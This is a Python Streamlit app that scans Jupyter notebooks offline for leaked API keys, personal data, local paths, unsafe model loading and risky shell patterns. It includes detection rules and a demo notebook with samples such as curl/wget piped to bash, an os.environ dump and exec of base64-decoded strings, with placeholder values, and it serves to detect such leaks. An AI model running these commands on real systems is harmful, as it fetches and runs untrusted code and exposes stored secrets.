"""
NotebookGuard Lite — Offline Jupyter Notebook Leak Scanner
===========================================================
Fully offline: no network calls.

Scans .ipynb notebooks for secrets, personal data, and suspicious
patterns that should not appear in shared or committed files.

CHECKS PERFORMED
    1. Secrets          — API keys (OpenAI, AWS, HuggingFace, GitHub, Google),
                          private-key blocks, database connection strings,
                          hardcoded passwords, Slack/Discord webhooks, Bearer tokens.
    2. PII              — Email addresses, phone numbers, credit-card numbers,
                          sensitive DataFrame column names (email, phone, SSN, etc.).
    3. Local paths      — Paths that expose the local username
                          (C:\\Users\\<name>\\, /home/<name>/, /Users/<name>/).
    4. ML safety        — torch.load without weights_only=True, pickle.load /
                          pickle.loads (untrusted files), trust_remote_code=True,
                          np.load(allow_pickle=True).
    5. Risky shell/exec — curl|wget piped to shell, os.environ dumps,
                          exec/eval with base64 decode.

HOW SCORING WORKS
    Each finding starts from a base score that reflects its category
    (secrets score highest, PII lower, paths in between).  Modifiers
    then adjust the score up or down:
      +20  if the value appears in an output cell (already printed/visible)
      +10  if the matched text fits a known high-specificity token format
       +8  if the same secret value appears in more than one cell
            (applies only to secrets — API keys, tokens, passwords, private keys)
      -60  if the value looks like a placeholder (your_api_key, changeme, etc.)
    The per-finding score is clamped to 0–100.
    The overall notebook score is the highest individual finding score plus a
    small log-scale volume bonus (capped at 15), also clamped to 100.

HOW TO RUN
    pip install streamlit pandas
    streamlit run app.py

LIMITATIONS
    - Regex-based: may miss obfuscated secrets; may flag false positives.
    - Does not execute code or make any network calls.
    - For awareness only — not a substitute for a full secrets-management policy.
"""

import csv
import io
import json
import math
import re

import pandas as pd
import streamlit as st

# ---------------------------------------------------------------------------
# SECTION 1 — Scoring config (all numbers in one place)
# ---------------------------------------------------------------------------
# Every tunable weight lives here so you can adjust without touching logic.

SCORE_CONFIG = {
    # Base scores by finding category
    "base_secret":   80,   # API keys / tokens
    "base_pii":      25,   # email, phone  (email-in-output = 25+20 = 45)
    "base_path":     30,   # local path with username
    "base_ml":       55,   # unsafe ML patterns (torch.load, trust_remote_code)
    "base_risky":    65,   # risky shell/exec patterns (curl|bash, exec+b64)

    # Modifier: finding is in an OUTPUT cell (already printed/visible)
    "bonus_output":  20,

    # Modifier: value matches a very specific, real-looking token format
    "bonus_known_format": 10,

    # Modifier: same secret found in more than one cell (already spread)
    "bonus_multi_cell": 8,

    # Modifier: value looks like a well-known placeholder, not a real secret
    "penalty_placeholder": -60,

    # Overall repo score = max individual + small volume bonus, capped here
    "volume_bonus_cap": 15,   # log-scale volume contribution, never exceeds this

    # Clamp for individual finding scores
    "min_score": 0,
    "max_score": 100,
}

# Strings that indicate a placeholder value, not a real secret
PLACEHOLDER_RE = re.compile(
    r"your[_-]?(?:api[_-]?)?(?:key|token|secret)"  # "your_api_key"
    r"|changeme"
    r"|<[^>]+>"                 # <YOUR_KEY_HERE>
    r"|\bexample\b"             # standalone word "example"
    r"|insert[_-]?key"
    r"|replace[_-]?me"
    r"|\bdummy\b"
    r"|\bfake\b"                # standalone word "fake"
    r"|xxxx+"                   # "xxxx..." run of x's
    r"|test[_-]?(?:key|token|secret|password)",  # test_key, test_password
    re.IGNORECASE,
)

# Patterns whose format is so specific that a match strongly implies a real secret.
# Used to award bonus_known_format.
KNOWN_FORMAT_RE = re.compile(
    r"AKIA[0-9A-Z]{16}"              # AWS access key exact prefix+length
    r"|sk-[A-Za-z0-9]{48}"          # OpenAI key (sk- + 48 chars)
    r"|hf_[A-Za-z0-9]{36}"          # HuggingFace (hf_ + 36 chars)
    r"|gh[pousr]_[A-Za-z0-9]{36}"   # GitHub token exact length
    r"|eyJ[A-Za-z0-9_\-]+\."        # JWT header segment
    r"|-----BEGIN.{0,20}PRIVATE KEY" # PEM private key
    r"|AIza[A-Za-z0-9_\-]{35}"      # Google API key
)

# ---------------------------------------------------------------------------
# SECTION 2 — Detection rules
# ---------------------------------------------------------------------------
# Each rule is a dict with:
#   name        short label shown in the UI
#   pattern     compiled regex
#   category    "secret" | "pii" | "path" | "ml" | "risky"
#   fix         one-line remediation hint
#   score_why   short human explanation for the score choice
#   mask_style  "key" | "email" | "phone" | "full" (controls redaction display)

RULES = [
    # ── Existing secret rules ────────────────────────────────────────────────
    {
        "name":       "OpenAI API Key",
        "pattern":    re.compile(r"sk-[A-Za-z0-9]{20,}", re.IGNORECASE),
        "category":   "secret",
        "fix":        "Revoke at platform.openai.com; store in an environment variable.",
        "score_why":  "High-entropy token grants full OpenAI account access.",
        "mask_style": "key",
    },
    {
        "name":       "AWS Access Key",
        "pattern":    re.compile(r"AKIA[0-9A-Z]{16}"),
        "category":   "secret",
        "fix":        "Rotate immediately in the AWS console; use IAM roles instead.",
        "score_why":  "AWS keys enable cloud resource access and billing charges.",
        "mask_style": "key",
    },
    {
        "name":       "HuggingFace Token",
        "pattern":    re.compile(r"hf_[A-Za-z0-9]{20,}", re.IGNORECASE),
        "category":   "secret",
        "fix":        "Revoke at huggingface.co/settings/tokens; use an env var.",
        "score_why":  "Grants write access to HuggingFace repos and private models.",
        "mask_style": "key",
    },
    {
        "name":       "GitHub Token",
        "pattern":    re.compile(r"gh[pousr]_[A-Za-z0-9]{36,}", re.IGNORECASE),
        "category":   "secret",
        "fix":        "Revoke at github.com/settings/tokens.",
        "score_why":  "GitHub tokens can read private repos and push code.",
        "mask_style": "key",
    },
    # ── New secret rules ─────────────────────────────────────────────────────
    {
        "name":       "Private Key Block",
        "pattern":    re.compile(r"-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----", re.IGNORECASE),
        "category":   "secret",
        "fix":        "Remove the private key; revoke and regenerate the key pair immediately.",
        "score_why":  "Exposed private key allows identity spoofing and decryption.",
        "mask_style": "key",
    },
    {
        "name":       "Database Connection String",
        "pattern":    re.compile(
            r"(?:postgres|postgresql|mysql|mongodb|mongodb\+srv|redis)"
            r"://[^:@\s\"']{1,60}:[^@\s\"']{3,}@",
            re.IGNORECASE,
        ),
        "category":   "secret",
        "fix":        "Never embed passwords in connection URLs; use env vars or a secrets manager.",
        "score_why":  "Embedded password grants direct database access.",
        "mask_style": "key",
    },
    {
        "name":       "Hardcoded Password Variable",
        "pattern":    re.compile(
            r"\b(?:password|passwd|pwd|db_?pass(?:word)?|app_?pass(?:word)?)"
            r"\s*=\s*[\"'](?!.*(?:your_|changeme|xxxx|example|fake|dummy))[^\"']{4,}[\"']",
            re.IGNORECASE,
        ),
        "category":   "secret",
        "fix":        "Load passwords from environment variables; never hardcode them.",
        "score_why":  "Hardcoded password is immediately usable by anyone with repo access.",
        "mask_style": "key",
    },
    {
        # Google API keys start with AIza followed by 35 URL-safe chars
        "name":       "Google API Key",
        "pattern":    re.compile(r"AIza[A-Za-z0-9_\-]{35}"),
        "category":   "secret",
        "fix":        "Restrict the key in Google Cloud Console and store it in an env var.",
        "score_why":  "Google API keys may enable Maps, Vision, or other paid Google services.",
        "mask_style": "key",
    },
    {
        # Slack: https://hooks.slack.com/services/T.../B.../...
        # Discord: https://discord.com/api/webhooks/...
        "name":       "Slack / Discord Webhook",
        "pattern":    re.compile(
            r"https://hooks\.slack\.com/services/T[A-Za-z0-9_]{8,}/B[A-Za-z0-9_]{8,}/[A-Za-z0-9_]{20,}"
            r"|https://discord(?:app)?\.com/api/webhooks/\d{15,}/[A-Za-z0-9_\-]{60,}",
        ),
        "category":   "secret",
        "fix":        "Revoke the webhook in your Slack/Discord workspace settings.",
        "score_why":  "A webhook URL allows anyone to post messages to your channel.",
        "mask_style": "key",
    },
    {
        # Bearer token in Authorization header (dict value, http header, or assignment)
        "name":       "Bearer Token",
        "pattern":    re.compile(
            r"[Aa]uthorization['\"]?\s*[=:]\s*['\"]?\s*Bearer\s+([A-Za-z0-9_\-\.]{20,})",
        ),
        "category":   "secret",
        "fix":        "Remove the Bearer token; read it from an environment variable at runtime.",
        "score_why":  "Bearer tokens grant API access to authenticated endpoints.",
        "mask_style": "key",
    },
    # ── PII rules ────────────────────────────────────────────────────────────
    {
        "name":       "Email Address",
        # (?<!\w)(?<!:) — must start at a word boundary and not follow a colon
        # so that DB URL passwords (postgres://user:pass@host) are excluded.
        "pattern":    re.compile(
            r"(?<!\w)(?<!:)[a-zA-Z0-9][a-zA-Z0-9._%+\-]*@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}"
        ),
        "category":   "pii",
        "fix":        "Redact personal data from notebook outputs before committing.",
        "score_why":  "Email addresses are personal data; lower base than API keys.",
        "mask_style": "email",
    },
    {
        "name":       "Phone Number",
        "pattern":    re.compile(
            r"(?<!\d)"
            r"(?:"
            r"\+\d{1,3}(?:[\s\-.]\(?\d{1,4}\)?)?(?:[\s\-.]\d{2,6}){1,4}"
            r"|"
            r"(?<![0-9])[6-9]\d{9}(?!\d)"
            r"|"
            r"\(?\d{3}\)?[\s\-.]\d{3}[\s\-.]\d{4}"
            r")"
            r"(?!\d)"
            r"(?!\.\d)"
        ),
        "category":   "pii",
        "fix":        "Remove phone numbers; use synthetic data in examples.",
        "score_why":  "Phone numbers are personal contact data.",
        "mask_style": "phone",
    },
    {
        "name":       "Credit Card Number",
        "pattern":    re.compile(r"\b(?:\d[ \-]?){13,16}\b"),
        "category":   "pii",
        "fix":        "Remove card numbers immediately; never store or log payment data.",
        "score_why":  "Luhn-valid card number may be real payment data.",
        "mask_style": "key",
        "validate":   "_luhn_valid",
    },
    {
        # DataFrame with sensitive column names: email, phone, aadhaar, ssn, dob
        "name":       "Sensitive Table Column",
        "pattern":    re.compile(
            r"\b(?:email|phone|aadhaar|aadhar|ssn|dob|date_of_birth)\b",
            re.IGNORECASE,
        ),
        "category":   "pii",
        "fix":        "Anonymise or drop sensitive columns before sharing notebooks.",
        "score_why":  "Column name indicates PII may be present in the dataframe.",
        "mask_style": "full",
        "validate":   "_in_table_context",
    },
    # ── Path rules ───────────────────────────────────────────────────────────
    {
        "name":       "Local Path (username exposed)",
        "pattern":    re.compile(
            r"[Cc]:\\[Uu]sers\\[^\\\"'\s]{2,30}\\"
            r"|/home/[^/\"'\s]{2,30}/"
            r"|/[Uu]sers/[^/\"'\s]{2,30}/"
        ),
        "category":   "path",
        "fix":        "Use relative paths or a PROJECT_ROOT environment variable.",
        "score_why":  "Exposes local username and directory structure.",
        "mask_style": "full",
    },
    # ── ML safety rules ──────────────────────────────────────────────────────
    {
        "name":       "Unsafe torch.load (no weights_only)",
        "pattern":    re.compile(r"\btorch\.load\s*\(", re.IGNORECASE),
        "category":   "ml",
        "fix":        "Pass weights_only=True to torch.load to prevent arbitrary code execution.",
        "score_why":  "Allows arbitrary code execution when loading untrusted checkpoints.",
        "mask_style": "full",
        "validate":   "_not_weights_only",
    },
    {
        "name":       "Unsafe pickle.load / pickle.loads",
        "pattern":    re.compile(r"\bpickle\.loads?\s*\(", re.IGNORECASE),
        "category":   "ml",
        "fix":        "Only load pickle files you trust, or use a safer format such as safetensors or JSON.",
        "score_why":  "pickle.load can execute arbitrary code embedded in the file.",
        "mask_style": "full",
    },
    {
        "name":       "trust_remote_code=True",
        "pattern":    re.compile(r"trust_remote_code\s*=\s*True", re.IGNORECASE),
        "category":   "ml",
        "fix":        "Only set trust_remote_code=True for models you have personally reviewed.",
        "score_why":  "Executes arbitrary Python from an external model repository.",
        "mask_style": "full",
    },
    {
        # np.load with allow_pickle=True can execute arbitrary code
        "name":       "np.load(allow_pickle=True)",
        "pattern":    re.compile(r"np\.load\s*\([^)]*allow_pickle\s*=\s*True", re.IGNORECASE),
        "category":   "ml",
        "fix":        "Avoid allow_pickle=True; use safe formats like .npy without pickle or .npz.",
        "score_why":  "allow_pickle=True in np.load enables arbitrary code execution via pickle.",
        "mask_style": "full",
    },
    # ── Risky shell / exec patterns ──────────────────────────────────────────
    {
        # curl ... | bash or wget ... | sh — classic remote code execution vector
        "name":       "curl/wget Pipe to Shell",
        "pattern":    re.compile(
            r"(?:!|subprocess|os\.system)[^\n]*(?:curl|wget)[^\n]*\|\s*(?:ba)?sh",
            re.IGNORECASE,
        ),
        "category":   "risky",
        "fix":        "Download scripts and inspect them manually before executing.",
        "score_why":  "Piping curl/wget to a shell runs untrusted remote code directly.",
        "mask_style": "full",
    },
    {
        # print(os.environ) or !env — leaks all environment variables including secrets
        "name":       "Environment Variable Dump",
        "pattern":    re.compile(
            r"print\s*\(\s*os\.environ"
            r"|!env\b"
            r"|os\.environ\b.*print",
            re.IGNORECASE,
        ),
        "category":   "risky",
        "fix":        "Never print os.environ; access only the specific key you need.",
        "score_why":  "Printing all env vars leaks every secret stored in the environment.",
        "mask_style": "full",
    },
    {
        # exec/eval combined with base64 decoding — classic obfuscated payload loader
        "name":       "exec/eval with base64 Decode",
        "pattern":    re.compile(
            r"(?:exec|eval)\s*\([^)]*base64",
            re.IGNORECASE,
        ),
        "category":   "risky",
        "fix":        "Never exec/eval base64-decoded strings; this pattern is used for obfuscated payloads.",
        "score_why":  "exec/eval of base64 content is a classic malware/obfuscation technique.",
        "mask_style": "full",
    },
]

# ---------------------------------------------------------------------------
# SECTION 3 — Validator helpers (called by rules that need extra checks)
# ---------------------------------------------------------------------------

def _luhn_valid(match_text):
    """Return True if match_text passes the Luhn checksum."""
    digits = re.sub(r"\D", "", match_text)
    if len(digits) < 13:
        return False
    total = 0
    for i, ch in enumerate(reversed(digits)):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def _not_weights_only(match_text, full_context):
    """Flag when weights_only=True is absent in the next 300 chars."""
    return not re.search(r"weights_only\s*=\s*True", full_context, re.IGNORECASE)


def _in_table_context(match_text, full_context):
    """Return True when the column name appears in a DataFrame/CSV context."""
    return bool(re.search(
        r"(?:read_csv|DataFrame|pd\.read|\.columns|df\[|to_csv"
        r"|,\s*['\"]?" + re.escape(match_text) + r"['\"]?\s*,"
        r"|\|\s*" + re.escape(match_text) + r"\s*\|)",
        full_context, re.IGNORECASE,
    ))


# ---------------------------------------------------------------------------
# SECTION 4 — Notebook parsing
# ---------------------------------------------------------------------------

def parse_notebook(raw_text):
    """Parse .ipynb JSON.

    Returns:
        (cells, warning) where cells is a list of dicts and warning is a str or None.
        cells is None when the file cannot be parsed at all.
    """
    try:
        nb = json.loads(raw_text)
    except (json.JSONDecodeError, TypeError):
        return None, "Could not read notebook: invalid JSON or unsupported format."

    cells = []
    for idx, cell in enumerate(nb.get("cells", []), start=1):
        if cell.get("cell_type") != "code":
            continue

        src_raw = cell.get("source", "")
        source  = "".join(src_raw) if isinstance(src_raw, list) else src_raw

        output_parts = []
        for out in cell.get("outputs", []):
            if "text" in out:
                v = out["text"]
                output_parts.append("".join(v) if isinstance(v, list) else v)
            if "data" in out:
                for mime, v in out["data"].items():
                    if "text" in mime:
                        output_parts.append("".join(v) if isinstance(v, list) else v)

        cells.append({
            "cell_number": idx,
            "source":      source,
            "outputs":     "\n".join(output_parts),
        })

    if not cells:
        return [], "Notebook contains no code cells — nothing to scan."

    return cells, None


# ---------------------------------------------------------------------------
# SECTION 5 — Scanning helpers
# ---------------------------------------------------------------------------

def _line_snippet(text, match_start, match_end, max_len=120):
    """Return the match line with >>>match<<< markers and trimmed context arms."""
    ls = text.rfind("\n", 0, match_start) + 1
    le = text.find("\n", match_end)
    le = le if le != -1 else len(text)

    line       = text[ls:le]
    rel_start  = match_start - ls
    rel_end    = match_end   - ls

    before     = line[:rel_start].lstrip()
    matched    = line[rel_start:rel_end]
    after      = line[rel_end:].rstrip()

    # Trim context arms so we stay under max_len
    ctx_arm    = max(0, (max_len - len(matched)) // 2)
    before     = ("…" + before[-(ctx_arm - 1):]) if len(before) > ctx_arm else before
    after      = (after[:ctx_arm - 1] + "…")     if len(after) > ctx_arm  else after

    return f"{before}>>>{matched}<<<{after}"


def _mask_email(value):
    """a***@domain.com — first letter + *** + @domain"""
    m = re.match(r"([a-zA-Z0-9._%+\-]+)(@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})", value)
    if not m:
        return "***@***"
    return m.group(1)[0] + "***" + m.group(2)


def _mask_phone(value):
    """Show only the last 2 digits: ********09"""
    digits = re.sub(r"\D", "", value)
    return "*" * max(0, len(digits) - 2) + digits[-2:]


def _mask_key(value):
    """Show first 4 and last 2 characters: AKIA***LE"""
    if len(value) <= 6:
        return "***"
    return value[:4] + "***" + value[-2:]


def _mask_snippet(snippet, matched_val, mask_style):
    """
    Replace the matched value inside the context snippet with the
    appropriate masked form.  The snippet already contains >>>val<<< markers.
    """
    if mask_style == "full":
        # Risky code lines: show the full line — no masking
        # Strip our own markers to give a clean display
        return snippet.replace(">>>", "").replace("<<<", "")

    if mask_style == "email":
        masked = _mask_email(matched_val)
    elif mask_style == "phone":
        masked = _mask_phone(matched_val)
    else:  # "key" (default)
        masked = _mask_key(matched_val)

    return snippet.replace(f">>>{matched_val}<<<", masked, 1)


def _compute_score(category, in_output, snippet):
    """Return (score 0-100, why str) using weights from SCORE_CONFIG."""
    cfg   = SCORE_CONFIG
    base  = cfg.get(f"base_{category}", cfg["base_secret"])
    score = base
    parts = [f"base {base} ({category})"]

    if in_output:
        score += cfg["bonus_output"]
        parts.append(f"+{cfg['bonus_output']} in output cell")

    if KNOWN_FORMAT_RE.search(snippet):
        score += cfg["bonus_known_format"]
        parts.append(f"+{cfg['bonus_known_format']} known token format")

    if PLACEHOLDER_RE.search(snippet):
        score += cfg["penalty_placeholder"]
        parts.append(f"{cfg['penalty_placeholder']} placeholder value")

    score = max(cfg["min_score"], min(cfg["max_score"], score))
    return score, " | ".join(parts)


# Categories that qualify for the "seen in multiple cells" bonus
_MULTI_CELL_CATEGORIES = {"secret"}

def scan_notebook(filename, raw_text):
    """Scan one notebook; return (findings, warning).

    findings is a list of finding dicts.
    warning is a str when the notebook could not be read or has no code cells.
    """
    cells, warning = parse_notebook(raw_text)

    if cells is None or not cells:
        return [], warning

    findings = []
    for cell in cells:
        for location, text in [("code", cell["source"]),
                                ("output", cell["outputs"])]:
            if not text:
                continue
            in_output = (location == "output")

            for rule in RULES:
                # "Sensitive Table Column" only applies to output cells
                if rule.get("validate") == "_in_table_context" and not in_output:
                    continue

                for match in rule["pattern"].finditer(text):
                    matched_val = match.group(0)

                    # ── Optional post-match validators ────────────────────
                    validator = rule.get("validate")
                    if validator == "_luhn_valid":
                        if not _luhn_valid(matched_val):
                            continue
                    elif validator == "_not_weights_only":
                        context = text[match.start(): match.start() + 300]
                        if not _not_weights_only(matched_val, context):
                            continue
                    elif validator == "_in_table_context":
                        context = text[max(0, match.start() - 200): match.end() + 200]
                        if not _in_table_context(matched_val, context):
                            continue

                    raw_snip = _line_snippet(text, match.start(), match.end())
                    score, why = _compute_score(rule["category"], in_output, raw_snip)
                    mask_style = rule.get("mask_style", "key")
                    display_snip = _mask_snippet(raw_snip, matched_val, mask_style)

                    findings.append({
                        "file":     filename,
                        "cell":     cell["cell_number"],
                        "where":    location,
                        "type":     rule["name"],
                        "snippet":  display_snip,
                        "score":    score,
                        "why":      why,
                        "fix":      rule["fix"],
                        "_raw":     matched_val,
                        "_cat":     rule["category"],
                    })

    return findings, None


def scan_all(file_pairs):
    """Scan all (filename, text) pairs; apply multi-cell bonus; return (sorted findings, warnings)."""
    all_findings = []
    warnings     = []
    for filename, text in file_pairs:
        if text and text.strip():
            findings, warn = scan_notebook(filename, text)
            all_findings.extend(findings)
            if warn:
                warnings.append(f"{filename}: {warn}")
        else:
            warnings.append(f"{filename}: Could not read notebook or file is empty.")

    # Multi-cell bonus applies only to secrets (API keys, tokens, passwords, private keys)
    val_cells: dict = {}
    for f in all_findings:
        if f["_cat"] in _MULTI_CELL_CATEGORIES:
            val_cells.setdefault(f["_raw"], set()).add(f["cell"])

    bonus = SCORE_CONFIG["bonus_multi_cell"]
    cfg   = SCORE_CONFIG
    for f in all_findings:
        if f["_cat"] in _MULTI_CELL_CATEGORIES and len(val_cells.get(f["_raw"], set())) > 1:
            f["score"] = min(cfg["max_score"], f["score"] + bonus)
            f["why"]  += f" | +{bonus} seen in multiple cells"

    return sorted(all_findings, key=lambda f: f["score"], reverse=True), warnings


def group_findings(findings):
    """Collapse findings into groups keyed by (file, cell, where, type)."""
    groups: dict = {}
    for f in findings:
        key = (f["file"], f["cell"], f["where"], f["type"])
        if key not in groups:
            groups[key] = {
                "file":     f["file"],
                "cell":     f["cell"],
                "where":    f["where"],
                "type":     f["type"],
                "score":    f["score"],
                "why":      f["why"],
                "fix":      f["fix"],
                "count":    0,
                "snippets": [],
            }
        g = groups[key]
        g["count"] += 1
        if f["score"] > g["score"]:
            g["score"] = f["score"]
            g["why"]   = f["why"]
        if f["snippet"] not in g["snippets"] and len(g["snippets"]) < 20:
            g["snippets"].append(f["snippet"])

    return sorted(groups.values(), key=lambda g: g["score"], reverse=True)


def overall_score(groups):
    """Repo-level score: max group score + log-scale volume bonus, capped at 100."""
    if not groups:
        return 0
    cfg    = SCORE_CONFIG
    top    = max(g["score"] for g in groups)
    volume = min(cfg["volume_bonus_cap"], int(6 * math.log2(len(groups) + 1)))
    return min(cfg["max_score"], top + volume)


# ---------------------------------------------------------------------------
# SECTION 6 — Demo notebook (fake data only — all values are non-functional)
# ---------------------------------------------------------------------------

def _demo_cell(n, src, out_text=None):
    """Build a minimal notebook cell dict."""
    outputs = []
    if out_text:
        outputs = [{"output_type": "stream", "name": "stdout", "text": [out_text]}]
    return {"cell_type": "code", "execution_count": n, "source": [src], "outputs": outputs}

DEMO_NOTEBOOK = json.dumps({
    "nbformat": 4, "nbformat_minor": 5,
    "cells": [
        _demo_cell(1,
            'import openai, os\nopenai.api_key = "sk-FAKEKEY1234567890ABCDEFGHIJKLMNOP"\n'
            'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\nSAFE = os.getenv("MY_KEY", "")'),
        _demo_cell(2,
            'df = pd.read_csv("/home/alice/projects/data/customers.csv")\nprint(df.head())',
            "   name   email                phone\n"
            "0  Alice  test@example.com    555-867-5309\n"
            "1  Bob    bob@example.org     555-123-4567\n"),
        _demo_cell(3,
            'hf_token = "hf_FAKETOKEN1234567890ABCDEFGHIJKLM"\nprint(hf_token)',
            "hf_FAKETOKEN1234567890ABCDEFGHIJKLM\n"),
        _demo_cell(4,
            'API_KEY = "your_api_key_here"\nTOKEN = "example_token"'),
        _demo_cell(5,
            'private_key = """\n-----BEGIN RSA PRIVATE KEY-----\n'
            'MIIEowIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4PAtEsHAJPFOGGbMWFMBXFRiFBJ\n'
            '-----END RSA PRIVATE KEY-----\n"""'),
        _demo_cell(6,
            'DB_URL = "postgres://admin:Sup3rS3cretPass@db.example.internal:5432/prod"\n'
            'engine = create_engine(DB_URL)'),
        _demo_cell(7,
            'db_password = "Tr0ub4dor&3"\napp_passwd = "P@ssw0rd2024"'),
        _demo_cell(8,
            'card_number = "4111111111111111"',
            "Card: 4111 1111 1111 1111\n"),
        _demo_cell(9,
            'import torch, pickle\nmodel = torch.load("checkpoint.pt")\n'
            "with open('model.pkl', 'rb') as f:\n    clf = pickle.load(f)\n"
            'pipe = pipeline("text-gen", model="org/model", trust_remote_code=True)'),
        _demo_cell(10,
            'GOOGLE_KEY = "AIzaEXAMPLEFAKEKEY12345678901bcdefghijk"\n'
            'maps_client = googlemaps.Client(key=GOOGLE_KEY)'),
        _demo_cell(11,
            'SLACK_HOOK = "https://hooks.slack.com/services/TEXAMPLE00/BEXAMPLE00/EXAMPLETOKEN1234567890"\n'
            'DISCORD_HOOK = "https://discord.com/api/webhooks/123456789012345/EXAMPLETOKEN_abcdefghijklmnopqrstuvwxyz1234567890AB"\n'
            "requests.post(SLACK_HOOK, json={'text': 'hello'})"),
        _demo_cell(12,
            'headers = {"Authorization": "Bearer EXAMPLE_BEARER_TOKEN_abcdefghijk1234567890"}\n'
            "resp = requests.get('https://api.example.com/data', headers=headers)"),
        _demo_cell(13,
            'data = np.load("model_weights.npy", allow_pickle=True)'),
        _demo_cell(14,
            'import os\nprint(os.environ)\n!env',
            "environ({'HOME': '/home/alice', 'OPENAI_API_KEY': 'sk-EXAMPLE...', "
            "'AWS_SECRET_ACCESS_KEY': 'EXAMPLEAWSSECRET'})\n"),
        _demo_cell(15,
            'df = pd.read_csv("users.csv")\n'
            'sensitive_cols = ["email", "phone", "aadhaar", "ssn", "dob"]\n'
            "df[sensitive_cols].head()",
            "   email              phone        aadhaar  ssn        dob\n"
            "0  test@example.com   555-867-5309  1234...  123-45     1990-01-01\n"),
        _demo_cell(16,
            '!curl https://example.com/EXAMPLE_install.sh | bash\n'
            '!wget -qO- https://example.com/EXAMPLE_setup.sh | sh'),
        _demo_cell(17,
            'payload = "cHJpbnQoJ0VYQU1QTEUnKQ=="\n'
            'exec(base64.b64decode(payload))\n'
            "eval(base64.b64decode('cHJpbnQoMSk='))"),
    ],
})


# ---------------------------------------------------------------------------
# SECTION 7 — Streamlit UI
# ---------------------------------------------------------------------------

st.set_page_config(page_title="NotebookGuard Lite 🔍", layout="wide")

st.title("🔍 NotebookGuard Lite")
st.caption("Offline Jupyter notebook leak scanner — no data leaves your machine.")

st.warning(
    "⚠️ **Demo only — do not upload real secrets, passwords, or personal data.** "
    "This tool is for awareness; treat all scan results as sensitive."
)

# ── Sidebar ──────────────────────────────────────────────────────────────────
with st.sidebar:
    st.header("📂 Input")
    uploaded = st.file_uploader(
        "Upload .ipynb notebook(s)",
        type=["ipynb"],
        accept_multiple_files=True,
    )
    use_demo = st.button("▶ Use demo notebook", use_container_width=True)

    st.divider()
    st.header("🎛️ Filter")
    min_score = st.slider("Minimum risk score", 0, 100, 0, step=5)
    all_types = [r["name"] for r in RULES]
    sel_types = st.multiselect("Finding types", all_types, default=all_types)

# ── Decide what to scan ───────────────────────────────────────────────────────
if uploaded:
    file_pairs = []
    for f in uploaded:
        try:
            file_pairs.append((f.name, f.read().decode("utf-8", errors="replace")))
        except Exception as exc:
            st.sidebar.warning(f"Could not read {f.name}: {exc}")
    st.sidebar.success(f"Loaded {len(file_pairs)} file(s).")
else:
    file_pairs = [("demo_notebook.ipynb", DEMO_NOTEBOOK)]
    if not use_demo:
        st.sidebar.info("Showing built-in demo data. Upload a notebook above to scan your own file.")

# ── Run scan (cached so filters don't re-trigger a full re-scan) ──────────────
@st.cache_data(show_spinner="Scanning…")
def _run_scan(pairs_tuple):
    """Thin cache wrapper — keyed on (filename, text) tuples."""
    return scan_all(list(pairs_tuple))

all_findings, scan_warnings = _run_scan(tuple(file_pairs))

for _w in scan_warnings:
    st.warning(f"⚠️ {_w}")

filtered_raw = [
    f for f in all_findings
    if f["score"] >= (min_score or 0) and f["type"] in (sel_types or [r["name"] for r in RULES])
]
groups = group_findings(filtered_raw)

repo_score = overall_score(groups)

# ── Top metrics ───────────────────────────────────────────────────────────────
m1, m2, m3, m4 = st.columns(4)
m1.metric("Finding groups",     len(groups))
m2.metric("Total matches",      sum(g["count"] for g in groups))
m3.metric("Overall risk score", f"{repo_score} / 100")
m4.metric("In output cells",    sum(g["count"] for g in groups if g["where"] == "output"))

# ── Early exit when clean ─────────────────────────────────────────────────────
if not groups:
    st.success("✅ No findings match the current filters.")
    st.stop()

# ── Bar chart: match count by finding type ────────────────────────────────────
st.subheader("📊 Findings by type")
type_counts: dict = {}
for g in groups:
    type_counts[g["type"]] = type_counts.get(g["type"], 0) + g["count"]

chart_df = (
    pd.DataFrame({"Type": list(type_counts), "Count": list(type_counts.values())})
    .set_index("Type")
    .sort_values("Count", ascending=False)
)
st.bar_chart(chart_df)

# ── Findings table (one row per group) ────────────────────────────────────────
st.subheader("📋 Findings table")

table_rows = []
for g in groups:
    table_rows.append({
        "File":    g["file"],
        "Cell":    f"cell {g['cell']}",
        "Where":   g["where"],
        "Type":    g["type"],
        "Score":   g["score"],
        "Matches": g["count"],
    })

st.dataframe(
    pd.DataFrame(table_rows),
    use_container_width=True,
    hide_index=True,
    column_config={
        "Score": st.column_config.ProgressColumn(
            "Score", min_value=0, max_value=100, format="%d"
        ),
        "Matches": st.column_config.NumberColumn("Matches", help="Number of regex matches in this group"),
    },
)

# ── Per-group expanders ────────────────────────────────────────────────────────
st.subheader("🔎 Finding details")

_RULE_CAT  = {r["name"]: r["category"] for r in RULES}
_RULE_WHY  = {r["name"]: r.get("score_why", "") for r in RULES}
ICON = {"secret": "🔴", "pii": "🟠", "path": "🟡", "ml": "🔵", "risky": "⛔"}
MAX_SNIPPETS  = 5
DEFAULT_SHOWN = 15

show_all = (len(groups) <= DEFAULT_SHOWN) or st.checkbox(
    f"Show all {len(groups)} groups (top {DEFAULT_SHOWN} shown by default)"
)
visible_groups = groups if show_all else groups[:DEFAULT_SHOWN]

for g in visible_groups:
    cat   = _RULE_CAT.get(g["type"], "path")
    icon  = ICON.get(cat, "⚪")
    count_tag = f"×{g['count']}" if g["count"] > 1 else ""
    label = (
        f"{icon} [{g['score']:3d}]  {g['file']} · cell {g['cell']} · "
        f"{g['where']}  —  {g['type']}  {count_tag}"
    )
    with st.expander(label):
        col_a, col_b = st.columns([1, 2])

        with col_a:
            st.markdown(f"**Type:** {g['type']}")
            st.markdown(f"**Location:** {g['where']} cell")
            st.markdown(f"**Risk score:** {g['score']} / 100")
            st.markdown(f"**Matches in this group:** {g['count']}")
            why_note = _RULE_WHY.get(g["type"])
            if why_note:
                st.caption(f"ℹ️ {why_note}")

        with col_b:
            shown    = g["snippets"][:MAX_SNIPPETS]
            leftover = g["count"] - len(shown)

            st.markdown("**Snippet(s) — sensitive values masked:**")
            for snip in shown:
                st.code(snip, language="python")
            if leftover > 0:
                st.caption(f"… and {leftover} more match(es) not shown.")

            st.markdown("**Why this score:**")
            st.caption(g["why"])
            st.markdown("**How to fix:**")
            st.info(g["fix"])

# ── CSV download ───────────────────────────────────────────────────────────────
